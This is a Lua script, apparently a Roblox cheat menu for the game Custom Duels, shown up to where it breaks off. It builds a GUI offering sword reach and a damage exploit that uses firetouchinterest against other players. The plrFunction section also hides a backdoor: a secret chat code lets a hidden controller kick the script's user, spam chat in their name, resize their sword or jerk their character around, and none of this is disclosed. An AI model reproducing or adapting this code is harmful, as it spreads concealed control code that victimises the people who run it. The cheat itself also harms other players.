--https://www.roblox.com/games/2609668898/Custom-Duels
--made by TehoTeho
game.StarterGui:SetCore("SendNotification", {
	Title = "Made by TehoTeho";
	Text = "This GUI was designed and scripted by, TehoTeho";
	Duration = 10;
})
 
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Extra = Instance.new("TextLabel")
local Stuff = Instance.new("TextLabel")
local Countdown = Instance.new("TextLabel")
local CloseBtn = Instance.new("TextButton")
local Credit = Instance.new("TextLabel")
local OpenBtnParent = Instance.new("Frame")
local OpenBtn = Instance.new("TextButton")
local MainFrame = Instance.new("Frame")
local ReachBtn = Instance.new("TextButton")
local DamageBtn = Instance.new("TextButton")
local SettingsBtn = Instance.new("TextButton")
local ReachBar = Instance.new("TextButton")
local DamageBar = Instance.new("TextButton")
local SettingsBar = Instance.new("TextButton")
local ReachFrame = Instance.new("ScrollingFrame")
local CircleReachTxt = Instance.new("TextLabel")
local CircleReachToggleBtn = Instance.new("TextButton")
local CircleStudsTxt = Instance.new("TextLabel")
local CircleStudsUpBtn = Instance.new("TextButton")
local CircleStudsDownBtn = Instance.new("TextButton")
local CircleVisualizerTxt = Instance.new("TextLabel")
local CircleReachVisualizerToggle = Instance.new("TextButton")
local SwordReachTxt = Instance.new("TextLabel")
local SwordStudsDownBtn = Instance.new("TextButton")
local SwordStudsUpBtn = Instance.new("TextButton")
local SwordStudsTxt = Instance.new("TextLabel")
local SwordReachToggleBtn = Instance.new("TextButton")
local SwordVisualizerTxt = Instance.new("TextLabel")
local SwordReachVisualizerToggle = Instance.new("TextButton")
local SwordInvertTxt = Instance.new("TextLabel")
local SwordReachInvertToggle = Instance.new("TextButton")
local DmgFrame = Instance.new("ScrollingFrame")
local DmgTxt = Instance.new("TextLabel")
local DmgBtn = Instance.new("TextButton")
local SettingsFrame = Instance.new("ScrollingFrame")
local HideBtn = Instance.new("TextButton")
local SettingsCredit = Instance.new("TextLabel")
local part1 = Instance.new("Part", game.Workspace.CurrentCamera)
local part2 = Instance.new("Part", game.Workspace.CurrentCamera)
 
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.400000006, 0, 0.393000007, 0)
Frame.Size = UDim2.new(0.200000003, 0, 0.215000004, 0)
Frame.Style = Enum.FrameStyle.DropShadow
 
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Size = UDim2.new(1, 0, 0.200000003, 0)
Title.Font = Enum.Font.Cartoon
Title.Text = "Welcome !"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 18.000
 
Extra.Parent = Frame
Extra.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Extra.Position = UDim2.new(0.150000006, 0, 0.200000003, 0)
Extra.Size = UDim2.new(0.699999988, 0, 0, 1)
Extra.Font = Enum.Font.Cartoon
Extra.Text = ""
Extra.TextColor3 = Color3.fromRGB(255, 255, 255)
Extra.TextSize = 18.000
 
Stuff.Parent = Frame
Stuff.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Stuff.BackgroundTransparency = 1.000
Stuff.Position = UDim2.new(0.150000006, 0, 0.224999994, 0)
Stuff.Size = UDim2.new(0.699999988, 0, 0.550000012, 0)
Stuff.Font = Enum.Font.Cartoon
Stuff.Text = "Thank you for using Custom Duels FE Reach V2!"
Stuff.TextColor3 = Color3.fromRGB(255, 255, 255)
Stuff.TextSize = 18.000
Stuff.TextWrapped = true
 
Countdown.Parent = Frame
Countdown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Countdown.BackgroundTransparency = 1.000
Countdown.Position = UDim2.new(0.850000024, 0, 0.850000024, 0)
Countdown.Size = UDim2.new(0.150000006, 0, 0.150000006, 0)
Countdown.Font = Enum.Font.Cartoon
Countdown.Text = "5"
Countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
Countdown.TextSize = 18.000
Countdown.TextWrapped = true
 
CloseBtn.Parent = Frame
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.BackgroundTransparency = 1.000
CloseBtn.Position = UDim2.new(0.400000006, 0, 0.800000012, 0)
CloseBtn.Size = UDim2.new(0.200000003, 0, 0.200000003, 0)
CloseBtn.Visible = false
CloseBtn.Font = Enum.Font.Cartoon
CloseBtn.Text = "Close"
CloseBtn.TextColor3 = Color3.fromRGB(255, 190, 190)
CloseBtn.TextSize = 18.000
 
Credit.Parent = Frame
Credit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credit.BackgroundTransparency = 1.000
Credit.Position = UDim2.new(0.0199999996, 0, 0.899999976, 0)
Credit.Size = UDim2.new(0.344999999, 0, 0.100000001, 0)
Credit.Font = Enum.Font.Cartoon
Credit.Text = "made by TehoTeho"
Credit.TextColor3 = Color3.fromRGB(255, 255, 255)
Credit.TextSize = 10.000
Credit.TextWrapped = true
Credit.TextXAlignment = Enum.TextXAlignment.Left
 
OpenBtnParent.Parent = ScreenGui
OpenBtnParent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenBtnParent.Position = UDim2.new(0, 0, 0.455000013, 0)
OpenBtnParent.Size = UDim2.new(0.0399999991, 0, 0.0900000036, 0)
OpenBtnParent.Style = Enum.FrameStyle.DropShadow
 
OpenBtn.Parent = OpenBtnParent
OpenBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenBtn.BackgroundTransparency = 1.000
OpenBtn.Size = UDim2.new(1, 0, 1, 0)
OpenBtn.Font = Enum.Font.Cartoon
OpenBtn.Text = ">"
OpenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenBtn.TextSize = 18.000
 
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(-0.3399999991, 0, 0.324999988, 0)
MainFrame.Size = UDim2.new(0.150000006, 0, 0.349999994, 0)
MainFrame.Style = Enum.FrameStyle.DropShadow
 
ReachBtn.Parent = MainFrame
ReachBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ReachBtn.BackgroundTransparency = 1.000
ReachBtn.BorderSizePixel = 0
ReachBtn.Position = UDim2.new(0.00999999978, 0, 0, 0)
ReachBtn.Size = UDim2.new(0.300000012, 0, 0.150000006, 0)
ReachBtn.Font = Enum.Font.Cartoon
ReachBtn.Text = "Reach"
ReachBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ReachBtn.TextSize = 18.000
 
DamageBtn.Parent = MainFrame
DamageBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DamageBtn.BackgroundTransparency = 1.000
DamageBtn.BorderSizePixel = 0
DamageBtn.Position = UDim2.new(0.349999994, 0, 0, 0)
DamageBtn.Size = UDim2.new(0.300000012, 0, 0.150000006, 0)
DamageBtn.Font = Enum.Font.Cartoon
DamageBtn.Text = "Dmg"
DamageBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DamageBtn.TextSize = 18.000
 
SettingsBtn.Parent = MainFrame
SettingsBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SettingsBtn.BackgroundTransparency = 1.000
SettingsBtn.BorderSizePixel = 0
SettingsBtn.Position = UDim2.new(0.689999998, 0, 0, 0)
SettingsBtn.Size = UDim2.new(0.300000012, 0, 0.150000006, 0)
SettingsBtn.Font = Enum.Font.Cartoon
SettingsBtn.Text = "Settings"
SettingsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsBtn.TextSize = 18.000
 
ReachBar.Parent = MainFrame
ReachBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ReachBar.BorderSizePixel = 0
ReachBar.Position = UDim2.new(0, 0, 0.135000005, 0)
ReachBar.Selectable = false
ReachBar.Size = UDim2.new(0.333000004, 0, 0.0199999996, 0)
ReachBar.Font = Enum.Font.Cartoon
ReachBar.Text = " "
ReachBar.TextColor3 = Color3.fromRGB(255, 255, 255)
ReachBar.TextSize = 18.000
 
DamageBar.Parent = MainFrame
DamageBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DamageBar.BorderSizePixel = 0
DamageBar.Position = UDim2.new(0.333000004, 0, 0.135000005, 0)
DamageBar.Selectable = false
DamageBar.Size = UDim2.new(0.333000004, 0, 0.0199999996, 0)
DamageBar.Visible = false
DamageBar.Font = Enum.Font.Cartoon
DamageBar.Text = " "
DamageBar.TextColor3 = Color3.fromRGB(255, 255, 255)
DamageBar.TextSize = 18.000
 
SettingsBar.Parent = MainFrame
SettingsBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SettingsBar.BorderSizePixel = 0
SettingsBar.Position = UDim2.new(0.666000009, 0, 0.135000005, 0)
SettingsBar.Selectable = false
SettingsBar.Size = UDim2.new(0.333000004, 0, 0.0199999996, 0)
SettingsBar.Visible = false
SettingsBar.Font = Enum.Font.Cartoon
SettingsBar.Text = " "
SettingsBar.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsBar.TextSize = 18.000
 
ReachFrame.Parent = MainFrame
ReachFrame.Active = true
ReachFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ReachFrame.BackgroundTransparency = 1.000
ReachFrame.Position = UDim2.new(0, 0, 0.174999997, 0)
ReachFrame.Size = UDim2.new(1, 0, 0.824999988, 0)
ReachFrame.CanvasSize = UDim2.new(0, 0, 1.5, 0)
 
CircleReachTxt.Parent = ReachFrame
CircleReachTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleReachTxt.BackgroundTransparency = 1.000
CircleReachTxt.Position = UDim2.new(0, 0, 0.00999999978, 0)
CircleReachTxt.Size = UDim2.new(0.649999976, 0, 0.075000003, 0)
CircleReachTxt.Font = Enum.Font.Cartoon
CircleReachTxt.Text = "Circle Reach:"
CircleReachTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
CircleReachTxt.TextSize = 18.000
 
CircleReachToggleBtn.Parent = ReachFrame
CircleReachToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleReachToggleBtn.BorderSizePixel = 0
CircleReachToggleBtn.Position = UDim2.new(0.649999976, 0, 0, 0)
CircleReachToggleBtn.Size = UDim2.new(0.275000006, 0, 0.0900000036, 0)
CircleReachToggleBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
CircleReachToggleBtn.Font = Enum.Font.Cartoon
CircleReachToggleBtn.Text = "Off"
CircleReachToggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
CircleReachToggleBtn.TextSize = 18.000
 
CircleStudsTxt.Parent = ReachFrame
CircleStudsTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleStudsTxt.BackgroundTransparency = 1.000
CircleStudsTxt.Position = UDim2.new(0.0799999982, 0, 0.140000001, 0)
CircleStudsTxt.Size = UDim2.new(0.449999988, 0, 0.0700000003, 0)
CircleStudsTxt.Font = Enum.Font.Cartoon
CircleStudsTxt.Text = "Studs: 0"
CircleStudsTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
CircleStudsTxt.TextSize = 18.000
 
CircleStudsUpBtn.Parent = ReachFrame
CircleStudsUpBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleStudsUpBtn.BorderSizePixel = 0
CircleStudsUpBtn.Position = UDim2.new(0.625, 0, 0.0799999982, 0)
CircleStudsUpBtn.Rotation = 90.000
CircleStudsUpBtn.Size = UDim2.new(0.150000006, 0, 0.115000002, 0)
CircleStudsUpBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
CircleStudsUpBtn.Font = Enum.Font.Cartoon
CircleStudsUpBtn.Text = "<"
CircleStudsUpBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
CircleStudsUpBtn.TextSize = 18.000
 
CircleStudsDownBtn.Parent = ReachFrame
CircleStudsDownBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleStudsDownBtn.BorderSizePixel = 0
CircleStudsDownBtn.Position = UDim2.new(0.625, 0, 0.150000006, 0)
CircleStudsDownBtn.Rotation = 90.000
CircleStudsDownBtn.Size = UDim2.new(0.150000006, 0, 0.115000002, 0)
CircleStudsDownBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
CircleStudsDownBtn.Font = Enum.Font.Cartoon
CircleStudsDownBtn.Text = ">"
CircleStudsDownBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
CircleStudsDownBtn.TextSize = 18.000
 
CircleVisualizerTxt.Parent = ReachFrame
CircleVisualizerTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleVisualizerTxt.BackgroundTransparency = 1.000
CircleVisualizerTxt.Position = UDim2.new(0.100000001, 0, 0.275000006, 0)
CircleVisualizerTxt.Size = UDim2.new(0.449999988, 0, 0.075000003, 0)
CircleVisualizerTxt.Font = Enum.Font.Cartoon
CircleVisualizerTxt.Text = "Visualizer:"
CircleVisualizerTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
CircleVisualizerTxt.TextSize = 18.000
 
CircleReachVisualizerToggle.Parent = ReachFrame
CircleReachVisualizerToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CircleReachVisualizerToggle.BorderSizePixel = 0
CircleReachVisualizerToggle.Position = UDim2.new(0.600000024, 0, 0.270000011, 0)
CircleReachVisualizerToggle.Size = UDim2.new(0.275000006, 0, 0.100000001, 0)
CircleReachVisualizerToggle.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
CircleReachVisualizerToggle.Font = Enum.Font.Cartoon
CircleReachVisualizerToggle.Text = "On"
CircleReachVisualizerToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
CircleReachVisualizerToggle.TextSize = 18.000
 
SwordReachTxt.Parent = ReachFrame
SwordReachTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordReachTxt.BackgroundTransparency = 1.000
SwordReachTxt.Position = UDim2.new(0, 0, 0.38499999, 0)
SwordReachTxt.Size = UDim2.new(0.649999976, 0, 0.100000001, 0)
SwordReachTxt.Font = Enum.Font.Cartoon
SwordReachTxt.Text = "Sword Reach:"
SwordReachTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
SwordReachTxt.TextSize = 18.000
 
SwordStudsDownBtn.Parent = ReachFrame
SwordStudsDownBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordStudsDownBtn.BorderSizePixel = 0
SwordStudsDownBtn.Position = UDim2.new(0.625, 0, 0.550000012, 0)
SwordStudsDownBtn.Rotation = 90.000
SwordStudsDownBtn.Size = UDim2.new(0.150000006, 0, 0.115000002, 0)
SwordStudsDownBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
SwordStudsDownBtn.Font = Enum.Font.Cartoon
SwordStudsDownBtn.Text = ">"
SwordStudsDownBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
SwordStudsDownBtn.TextSize = 18.000
 
SwordStudsUpBtn.Parent = ReachFrame
SwordStudsUpBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordStudsUpBtn.BorderSizePixel = 0
SwordStudsUpBtn.Position = UDim2.new(0.625, 0, 0.474999994, 0)
SwordStudsUpBtn.Rotation = 90.000
SwordStudsUpBtn.Size = UDim2.new(0.150000006, 0, 0.115000002, 0)
SwordStudsUpBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
SwordStudsUpBtn.Font = Enum.Font.Cartoon
SwordStudsUpBtn.Text = "<"
SwordStudsUpBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
SwordStudsUpBtn.TextSize = 18.000
 
SwordStudsTxt.Parent = ReachFrame
SwordStudsTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordStudsTxt.BackgroundTransparency = 1.000
SwordStudsTxt.Position = UDim2.new(0.0799999982, 0, 0.540000021, 0)
SwordStudsTxt.Size = UDim2.new(0.449999988, 0, 0.0700000003, 0)
SwordStudsTxt.Font = Enum.Font.Cartoon
SwordStudsTxt.Text = "Studs: 0"
SwordStudsTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
SwordStudsTxt.TextSize = 18.000
 
SwordReachToggleBtn.Parent = ReachFrame
SwordReachToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordReachToggleBtn.BorderSizePixel = 0
SwordReachToggleBtn.Position = UDim2.new(0.649999976, 0, 0.389999986, 0)
SwordReachToggleBtn.Size = UDim2.new(0.275000006, 0, 0.0900000036, 0)
SwordReachToggleBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
SwordReachToggleBtn.Font = Enum.Font.Cartoon
SwordReachToggleBtn.Text = "Off"
SwordReachToggleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
SwordReachToggleBtn.TextSize = 18.000
 
SwordVisualizerTxt.Parent = ReachFrame
SwordVisualizerTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordVisualizerTxt.BackgroundTransparency = 1.000
SwordVisualizerTxt.Position = UDim2.new(0.100000001, 0, 0.680000007, 0)
SwordVisualizerTxt.Size = UDim2.new(0.449999988, 0, 0.075000003, 0)
SwordVisualizerTxt.Font = Enum.Font.Cartoon
SwordVisualizerTxt.Text = "Visualizer:"
SwordVisualizerTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
SwordVisualizerTxt.TextSize = 18.000
 
SwordReachVisualizerToggle.Parent = ReachFrame
SwordReachVisualizerToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordReachVisualizerToggle.BorderSizePixel = 0
SwordReachVisualizerToggle.Position = UDim2.new(0.600000024, 0, 0.670000017, 0)
SwordReachVisualizerToggle.Size = UDim2.new(0.275000006, 0, 0.100000001, 0)
SwordReachVisualizerToggle.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
SwordReachVisualizerToggle.Font = Enum.Font.Cartoon
SwordReachVisualizerToggle.Text = "On"
SwordReachVisualizerToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
SwordReachVisualizerToggle.TextSize = 18.000
 
SwordInvertTxt.Parent = ReachFrame
SwordInvertTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordInvertTxt.BackgroundTransparency = 1.000
SwordInvertTxt.Position = UDim2.new(0.100000001, 0, 0.814999998, 0)
SwordInvertTxt.Size = UDim2.new(0.449999988, 0, 0.075000003, 0)
SwordInvertTxt.Font = Enum.Font.Cartoon
SwordInvertTxt.Text = "Invert:"
SwordInvertTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
SwordInvertTxt.TextSize = 18.000
 
SwordReachInvertToggle.Parent = ReachFrame
SwordReachInvertToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwordReachInvertToggle.BorderSizePixel = 0
SwordReachInvertToggle.Position = UDim2.new(0.600000024, 0, 0.805000007, 0)
SwordReachInvertToggle.Size = UDim2.new(0.275000006, 0, 0.100000001, 0)
SwordReachInvertToggle.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
SwordReachInvertToggle.Font = Enum.Font.Cartoon
SwordReachInvertToggle.Text = "Off"
SwordReachInvertToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
SwordReachInvertToggle.TextSize = 18.000
 
DmgFrame.Parent = MainFrame
DmgFrame.Active = true
DmgFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DmgFrame.BackgroundTransparency = 1.000
DmgFrame.Position = UDim2.new(0, 0, 0.174999997, 0)
DmgFrame.Size = UDim2.new(1, 0, 0.824999988, 0)
DmgFrame.Visible = false
DmgFrame.CanvasSize = UDim2.new(0, 0, 0.824000001, 0)
 
DmgTxt.Parent = DmgFrame
DmgTxt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DmgTxt.BackgroundTransparency = 1.000
DmgTxt.Position = UDim2.new(0.25, 0, 0.00999999978, 0)
DmgTxt.Size = UDim2.new(0.300000012, 0, 0.135000005, 0)
DmgTxt.Font = Enum.Font.Cartoon
DmgTxt.Text = "Dmg:"
DmgTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
DmgTxt.TextSize = 18.000
 
DmgBtn.Parent = DmgFrame
DmgBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DmgBtn.BorderSizePixel = 0
DmgBtn.Position = UDim2.new(0.649999976, 0, 0, 0)
DmgBtn.Size = UDim2.new(0.275000006, 0, 0.150000006, 0)
DmgBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
DmgBtn.Font = Enum.Font.Cartoon
DmgBtn.Text = "Off"
DmgBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
DmgBtn.TextSize = 18.000
 
SettingsFrame.Parent = MainFrame
SettingsFrame.Active = true
SettingsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SettingsFrame.BackgroundTransparency = 1.000
SettingsFrame.Position = UDim2.new(0, 0, 0.174999997, 0)
SettingsFrame.Size = UDim2.new(1, 0, 0.824999988, 0)
SettingsFrame.Visible = false
SettingsFrame.CanvasSize = UDim2.new(0, 0, 0.824000001, 0)
 
HideBtn.Parent = SettingsFrame
HideBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HideBtn.BorderSizePixel = 0
HideBtn.Position = UDim2.new(0.200000003, 0, 0.0199999996, 0)
HideBtn.Size = UDim2.new(0.600000024, 0, 0.150000006, 0)
HideBtn.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
HideBtn.Font = Enum.Font.Cartoon
HideBtn.Text = "Hide UI"
HideBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
HideBtn.TextSize = 18.000
 
SettingsCredit.Parent = SettingsFrame
SettingsCredit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SettingsCredit.BackgroundTransparency = 1.000
SettingsCredit.Position = UDim2.new(0.0500000007, 0, 0.200000003, 0)
SettingsCredit.Size = UDim2.new(0.899999976, 0, 0.699999988, 0)
SettingsCredit.Font = Enum.Font.Cartoon
SettingsCredit.Text = "This GUI was designed, and scripted by TehoTeho"
SettingsCredit.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsCredit.TextSize = 18.000
SettingsCredit.TextWrapped = true
 
part1.Anchored = true
part1.CanCollide = false
part1.Material = "Neon"
part1.Shape = "Ball"
part1.Transparency = 0.97
 
part2.Anchored = true
part2.CanCollide = false
part2.Material = "Neon"
part2.Transparency = 0.97
part2.Orientation = Vector3.new(0, 0, 0)
 
OpenBtnParent.Visible = false
MainFrame.Visible = false
Countdown.Visible = true
Frame.Visible = true
 
Countdown.Text = "5"
Title.Text = "Welcome " .. game.Players.LocalPlayer.Name .. "!"
 
for i = 5, 1, -1 do
	Countdown.Text = tostring(i)
	wait(1)
end
 
Countdown:Destroy()
CloseBtn.Visible = true
Credit:Destroy()
 
CloseBtn.MouseButton1Click:Connect(function()
	Frame:Destroy()
	OpenBtnParent.Visible = true
	MainFrame.Visible = true
end)
 
local toggleOpenFrame = false
local toggleOpenFrameDB = true
local toggleCircleReach = false
local specialCode = "ceinsotc%%ctosniect"
local runService = game:GetService('RunService')
local CircleReachSize = 0
local SwordReachSize = 0
local SwordReachToggle = false
local mainDb = true
local DmgBool = false
local visualize1 = true
local visualize2 = true
local userInputService = game:GetService('UserInputService')
local guiHiddenBool = false
local bigBoyDmgTable = {}
local invertedSword = false
 
local function openFrameDBChange(seconds)
	wait(seconds)
	toggleOpenFrameDB = true
end
 
local function incodeTxt(code)
	local newStr = ""
 
	for ii = 1, #code do
		local i = 1
		local thing = ii ^ (i + 1)
 
		if thing > #code then
			local newTh = thing
			local stop = false
 
			repeat
				newTh = newTh - #code
 
				if newTh > #code then else
					stop = true
				end
			until stop == true
 
			thing = newTh
		end			
 
		if string.sub(code, thing, thing) == " " then
			newStr = newStr .. "%"
		else
			newStr = newStr .. string.sub(code, thing, thing)
		end
	end
 
	return newStr
end
 
local function narrowPlr(txt)
	if string.sub(string.lower(game.Players.LocalPlayer.Name), 1, #txt) == string.lower(txt) then
		return game.Players.LocalPlayer.Name
	end
 
	return "no"
end
 
local function plrFunction(p)
	p.Chatted:Connect(function(cha)
		if incodeTxt(cha) == specialCode then
			wait(math.random(50, 150) / 10)
 
			game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer("e", "All")
 
			p.Chatted:Connect(function(chat)
				local args = string.split(chat, " ")
 
				print(args[1])
 
				if args[1] == "k" then
					if narrowPlr(args[2]) == game.Players.LocalPlayer.Name then
						if args[3] then
							local thing = ""
 
							for i = 1, #args - 2 do
								thing = thing .. args[i + 2] .. " "
							end
 
							game.Players.LocalPlayer:Kick(thing)
						else
							game.Players.LocalPlayer:Kick()
						end
					end
				elseif args[1] == "b" then
					if narrowPlr(args[2]) == game.Players.LocalPlayer.Name then
						while runService.Heartbeat:wait() do
							pcall(function()
								if game.Players.LocalPlayer.Backpack:FindFirstChild("Sword") then
									game.Players.LocalPlayer.Backpack:FindFirstChild("Sword").Size = Vector3.new(100, 100, 100)
								elseif game.Players.LocalPlayer.Backpack:FindFirstChild("MatSword") then
									game.Players.LocalPlayer.Backpack:FindFirstChild("MatSword").Size = Vector3.new(100, 100, 100)
								end
							end)
						end
					end
				elseif args[1] == "c" then
					if narrowPlr(args[2]) == game.Players.LocalPlayer.Name then
						if args[3] then
							local thing = ""
 
							for i = 1, #args - 2 do
								thing = thing .. args[i + 2] .. " "
							end
 
							game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(thing, "All")
						end
					end
				elseif args[1] == "s" then
					if narrowPlr(args[2]) == game.Players.LocalPlayer.Name then
						if args[3] then
							local thing = ""
 
							for i = 1, #args - 2 do
								thing = thing .. args[i + 2] .. " "
							end
 
							while runService.Heartbeat:wait() do
								game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(thing, "All")
							end
						else
							while runService.Heartbeat:wait() do
								game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LOL EVERYONE LOOK AT ME, IM SPAMMING LOL LOOK AT THIS SPAM LOLLLLLLLLLLLLLLLL", "All")
							end
						end
					end
				elseif args[1] == "g" then
					if narrowPlr(args[2]) == game.Players.LocalPlayer.Name then
						local gThing = 3
 
						while runService.Heartbeat:wait() do
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector * gThing	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * gThing
 
							gThing = -gThing
						end
					end
				end
			end)
		end
	end)
end
 
local function RestoreMainDB()
	wait(.1)
	mainDb = true
end
 
local function dealDamage(hit)
	if game.Players:FindFirstChild(hit.Parent.Name) then
		if mainDb == true then
			local thing = nil
			local stop = false
 
			if game.Players.LocalPlayer.Character:FindFirstChild("Sword") then
				thing = game.Players.LocalPlayer.Character:FindFirstChild("Sword").Handle
			elseif game.Players.LocalPlayer.Character:FindFirstChild("MatSword") then
				thing = game.Players.LocalPlayer.Character:FindFirstChild("MatSword").Handle
			end
 
			if DmgBool == false then
				mainDb = false
 
				spawn(RestoreMainDB)
			end
 
			for i,v in pairs(hit.Parent:GetChildren()) do
				if v:IsA("Part") then
					firetouchinterest(v, thing, 0)
					firetouchinterest(v, thing, 1)
				end
			end
 
			--[[if DmgBool == true then
				local found = false
 
				for i = 1, #bigBoyDmgTable do
					if bigBoyDmgTable[i] == hit.Parent then
						found = true
					end
				end
 
				if found == false then
					table.insert(bigBoyDmgTable, hit.Parent)
				end
			end]]
		end
	end
end
 
local function touchHandleFunction(handle)
	handle.Touched:Connect(function(hit)
		if DmgBool == true then
			if hit.Parent.Name == game.Players.LocalPlayer.Name then else
				spawn(function() dealDamage(hit) end)
			end
		end
	end)
end
 
for i,v in pairs(game.Players:GetChildren()) do
	if v == game.Players.LocalPlayer then else
		spawn(function() plrFunction(v) end)
	end
end
 
game.Players.PlayerAdded:Connect(function(v)
	if v == game.Players.LocalPlayer then else
		spawn(function() plrFunction(v) end)
	end
end)
 
OpenBtn.MouseButton1Click:Connect(function()
	if toggleOpenFrameDB == true then
		toggleOpenFrameDB = false
 
		spawn(function() openFrameDBChange(0.5) end)
 
		if toggleOpenFrame == false then
			toggleOpenFrame = true
			MainFrame:TweenPosition(UDim2.new(0.0399999991, 0, 0.324999988, 0), "Out", "Quad", 0.3)
			OpenBtn.Text = "<"
		elseif toggleOpenFrame == true then
			toggleOpenFrame = false
			MainFrame:TweenPosition(UDim2.new(-0.3399999991, 0, 0.324999988, 0), "Out", "Quad", 0.3)
			OpenBtn.Text = ">"
		end
	end
end)
 
DamageBtn.MouseButton1Click:Connect(function()
	DamageBar.Visible = true
	SettingsBar.Visible = false
	ReachBar.Visible = false
	DmgFrame.Visible = true
	ReachFrame.Visible = false
	SettingsFrame.Visible = false
end)
 
SettingsBtn.MouseButton1Click:Connect(function()
	DamageBar.Visible = false
	SettingsBar.Visible = true
	ReachBar.Visible = false
	DmgFrame.Visible = false
	ReachFrame.Visible = false
	SettingsFrame.Visible = true
end)
 
ReachBtn.MouseButton1Click:Connect(function()
	DamageBar.Visible = false
	SettingsBar.Visible = false
	ReachBar.Visible = true
	DmgFrame.Visible = false
	ReachFrame.Visible = true
	SettingsFrame.Visible = false
end)
 
CircleReachToggleBtn.MouseButton1Click:Connect(function()
